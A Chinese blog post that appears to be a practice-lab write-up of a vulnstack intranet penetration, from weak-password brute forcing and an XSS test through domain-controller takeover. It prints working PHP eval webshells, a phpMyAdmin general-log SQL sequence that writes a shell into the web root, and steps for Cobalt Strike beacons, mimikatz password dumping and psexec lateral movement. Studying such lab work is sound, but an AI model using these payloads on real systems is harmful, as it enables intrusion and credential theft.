---
author: "XINO"
title: "记一次vulnstack靶场渗透流程"
date: 2022-10-19
description: "最近再学内网渗透，准备把涉及内网的基本渗透流程学习学习，正好好友搭建了一个内网靶场，于是我就借着他的平台练习一下，下面来给大家总结一下我渗透的过程。希望能帮助大家。"
tags: ["掘金·日新计划","安全","黑客"]
ShowReadingTime: "阅读3分钟"
weight: 407
---
持续创作，加速成长！这是我参与「掘金日新计划 · 10 月更文挑战」的第21天，[点击查看活动详情](https://juejin.cn/post/7147654075599978532 "https://juejin.cn/post/7147654075599978532")

引文
==

最近再学内网渗透，准备把涉及**内网**的基本**渗透流程**学习学习，正好好友搭建了一个内网靶场，于是我就借着他的平台练习一下，下面来给大家总结一下我渗透的过程。希望能帮助大家。

网站漏洞
====

渗透的话我们首先一步是进行外网打点，好友只给了我们一个IP，进入之后的页面是这样的：

![2.PNG](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8a41813ae9c24e4fbacc47f5ab2b5d44~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

XRAY漏洞扫描工具扫描网站发现备份源码beifen.rar，我们分析源码找到CMS网站yxcms,开始我们的渗透测试。

arduino

 代码解读

复制代码

`http://vps/yxcms/`

![图片.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/30130624a11d488fa890fad47346e923~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

敏感信息泄露 + 弱口令
------------

在遍历网站信息时，我们发现了后台管理的URL地址

ini

 代码解读

复制代码

`/index.php?r=admin`

尝试使用抓包工具BURPSUITE进行密码爆破，成功后得到密码：

 代码解读

复制代码

`admin/123456`

PhpMyAdmin弱口令
-------------

扫目录发现/phpmyadmin管理系统,我们还是尝试爆破弱口令，得到PHPMYADMIN管理系统密码：

bash

 代码解读

复制代码

`root/root`

![图片.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b1bfcc1e17c742cdbd89e43a8e6c3c84~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

yxcms功能点 留言本 存在存储型XSS漏洞
-----------------------

在浏览网站结构时，发现留言板页面，通常留言板会存在XSS漏洞，我们尝试一下：

![图片.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/38997dc0ed664695b36f7ea7aa9ee4ca~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

`test<script>alert(45)</script>`

![图片.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1831db3096224852a22b46f755258b2f~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

成功弹窗，说明可以利用，之后可以利用这个漏洞获取管理员cookie等信息。

后台任意文件读写漏洞
----------

前面已知管理员账号密码，于是我们进入后台，发现存在前台模板，我们可以新建模板来传入一句话木马。

php

 代码解读

复制代码

`<?php eval($_POST[XINO]);?>` 

因为我们之前下载了源码，代码审计后发现文件保存路径为

arduino

 代码解读

复制代码

`yxcms/protected/apps/default/view/default/xino.php`

可以连接菜刀蚁剑。

PhpMyAdmin 开启全局日志getshell
-------------------------

参考：[phpMyAdmin拿shell的两种方法 - -冰封 - 博客园 (cnblogs.com)](https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Ffzblog%2Fp%2F13912387.html%23%3A~%3Atext%3D%25E4%25BA%258C.Phpmyadmin%25E6%258B%25BFshell%25E7%259A%2584%25E4%25B8%25A4%25E7%25A7%258D%25E6%2596%25B9%25E6%25B3%2595%25201.%25E4%25BD%258E%25E7%2589%2588%25E6%259C%25ACMysql%2520Mysql%25E4%25BD%258E%25E4%25BA%258E5.0%25EF%25BC%258C%25E5%258F%25AF%25E4%25BB%25A5%25E7%259B%25B4%25E6%258E%25A5%25E9%2580%259A%25E8%25BF%2587outfile%25E5%2586%2599%25E5%2585%25A5%25EF%25BC%259A%2520SELECT%2520%2522%253C%253Fphp%2520%2540assert%2520%2528%2524_REQUEST%2C%255B%2522%2520admin%2520%2522%255D%2529%253B%253F%253E%2522%2520INTO%2520OUTFILE%2520%2527%252F%25E7%25BD%2591%25E7%25AB%2599%25E7%25BB%259D%25E5%25AF%25B9%25E8%25B7%25AF%25E5%25BE%2584%252Fshell.php%2527%25202.%25E9%25AB%2598%25E7%2589%2588%25E6%259C%25ACMysql "https://www.cnblogs.com/fzblog/p/13912387.html#:~:text=%E4%BA%8C.Phpmyadmin%E6%8B%BFshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%201.%E4%BD%8E%E7%89%88%E6%9C%ACMysql%20Mysql%E4%BD%8E%E4%BA%8E5.0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87outfile%E5%86%99%E5%85%A5%EF%BC%9A%20SELECT%20%22%3C%3Fphp%20%40assert%20%28%24_REQUEST,%5B%22%20admin%20%22%5D%29%3B%3F%3E%22%20INTO%20OUTFILE%20%27%2F%E7%BD%91%E7%AB%99%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%2Fshell.php%27%202.%E9%AB%98%E7%89%88%E6%9C%ACMysql")

首先判断secure\_file\_priv是否为空

sql

 代码解读

复制代码

`show variables like '%secure%'`

![图片.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b8b04c763bdc42a8a4517b1bcc73a611~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

查询日志保存状态

sql

 代码解读

复制代码

`show variables like '%general%'`

![图片.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c6789f5508f04ff69c1dccb2d340f735~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php

ini

 代码解读

复制代码

`set global general_log=on; set global general_log_file='C:/phpStudy/WWW/hack.php';`

![图片.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e40b811d10f942a89e28d4c9a3fbf51a~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

执行sql查询语句并在里面包含一句话木马，一句话木马将写入到日志文件hack.php中

ini

 代码解读

复制代码

`Select '<?php eval($_REQUEST[xino]);?>'`

蚁剑连接成功。

![Inkedimage.jpg](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1e0c547cf50b433c9eb0b91969c84935~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

主机上线cs
------

靶机为windows系统，因此用cs生成一个windows可执行木马。

![图片.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/64bcc91687f54ed5bf0dc4ad94a2a674~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

使用蚁剑上传并执行

![图片.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3255a1f909064c82992d293bbea02de6~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

![图片.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4697972d92c94cea9e85cefd4fd21fff~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

可以在cs上看到主机成功上线，当然不止这一种方式，只是列了其中一种。

![Inkedimage1.jpg](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/935186a0eeca480ca9778f4748dbbe85~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

后渗透阶段
=====

win7信息收集
--------

使用命令ipconfig发现存在内网网卡

![Inkedimage2.jpg](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6ac17b38ead74b109e7ea2615b227643~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

使用命令查看域信息

arduino

 代码解读

复制代码

`net config Workstation`

![Inkedimage3.jpg](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9a57c8a376c24f769dd0dd17d008a1e6~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

![图片.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/426d367c2a464a42a19bcecd09efec0b~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

接下来探测主机：

sql

 代码解读

复制代码

`net view（需提权至system，执行此命令后所有探测到的主机将在目标列表中显示）`

![Inkedimage4.jpg](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b6bd025f5cb4449eabdb45c30c0f0636~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

![Inkedimage5.jpg](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/aa2c4fecf19f403a8bd65bbbaebee542~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

其中OWA为域控，ROOT-XXX为域成员

提权
--

使用cs内置模块进行提权

![图片.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/050663bacbbc47d889830eace7fb13f6~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

成功后将上线一个system权限的会话

获取明文密码
------

1.通过msf的hashdump等模块

2.使用mimikatz或者cs中的mimikatz模块

这里用cs中自带的

![Inkedimage6.jpg](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c765991cf404402c897c9309949c56dd~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

![7.PNG](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8ec4d9f7f2464673a0cbbbf3059c02b3~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

横向移动
----

有了域管理员账号后，可以使用该域管理员账号密码利用 psexec 登录域内任何一台开启了admin$共享(该共享默认开启) 的主机。

![图片.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8c65e9873f3d4265ba30b3e271ac8470~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

![Inkedimage7.jpg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5232543dc144478b81bd382d94d591fe~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

在此之前需要创建一个smb监听器：

![8.PNG](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/751e435adb0d4611bf458919ce503065~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)

成功后域控主机将出现在会话列表,使用同样的方法可以控制域成员。

结语
==

作为该系列最简单的靶场渗透过程还是比较顺利的，以后会给大家带来其他靶场的渗透流程供大家参考，有兴趣的小伙伴可以自己去试一试，喜欢本文的朋友不妨一键三连。